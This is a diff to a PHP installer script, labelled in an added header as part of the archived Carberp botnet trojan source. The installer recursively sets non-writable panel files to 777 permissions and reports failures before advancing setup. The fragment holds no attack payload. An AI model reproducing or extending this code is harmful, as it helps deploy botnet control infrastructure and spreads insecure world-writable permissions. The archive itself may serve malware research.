@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 "<?php echo $lang['py']; ?>"
 <br /><br />
 <?php
@@ -7,14 +18,24 @@ $INSTALL = false;
 
 define(__DIR__, str_replace(DIRECTORY_SEPARATOR . 'scripts' . DIRECTORY_SEPARATOR . 'install', '', dirname(__FILE__)));
 
-function recurse($dir){	global $INSTALL, $lang;
-	if(is_file($dir)){		if(basename($dir) != '.htaccess' && basename($dir) != '.' && basename($dir) != '..'){			if(!is_writable($dir)){				if(!@chmod($dir, '777')){					$INSTALL = true;
+function recurse($dir){
+	global $INSTALL, $lang;
+	if(is_file($dir)){
+		if(basename($dir) != '.htaccess' && basename($dir) != '.' && basename($dir) != '..'){
+			if(!is_writable($dir)){
+				if(!@chmod($dir, '777')){
+					$INSTALL = true;
 					echo $dir . ': <span style="color:red">'.$lang['nd'].'</span><hr />';
 				}
 			}
 		}
-	}elseif(is_dir($dir)){		$d = scandir($dir);
-		foreach($d as $value){			if($value != '.htaccess' && $value != '.' && $value != '..'){				if(!is_writable($dir . $value)){					if(!@chmod($dir . $value, '777')){						$INSTALL = true;
+	}elseif(is_dir($dir)){
+		$d = scandir($dir);
+		foreach($d as $value){
+			if($value != '.htaccess' && $value != '.' && $value != '..'){
+				if(!is_writable($dir . $value)){
+					if(!@chmod($dir . $value, '777')){
+						$INSTALL = true;
 						echo $dir . $value . ': <span style="color:red">'.$lang['nd'].'</span><hr />';
 					}
 				}
@@ -42,7 +63,9 @@ recurse(__DIR__ . '/includes/config.php');
 ?>
 <br />
 <?php
-if($INSTALL != true){	if($_GET['step'] == 3){		$_SESSION['step'] = 3;
+if($INSTALL != true){
+	if($_GET['step'] == 3){
+		$_SESSION['step'] = 3;
 	}
 ?>
 <?php echo $lang['pf']; ?>
